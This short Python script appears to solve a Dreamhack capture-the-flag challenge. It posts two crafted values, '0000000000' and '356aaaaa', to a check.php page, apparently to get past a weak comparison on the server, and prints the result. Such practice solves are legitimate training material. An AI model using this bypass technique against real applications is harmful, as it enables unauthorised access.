import requests
from bs4 import BeautifulSoup


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:14960"
    req = requests.post(url+'/check.php', {'input1':'0000000000', 'input2':'356aaaaa'})
    print(BeautifulSoup(req.content, 'html.parser').pre)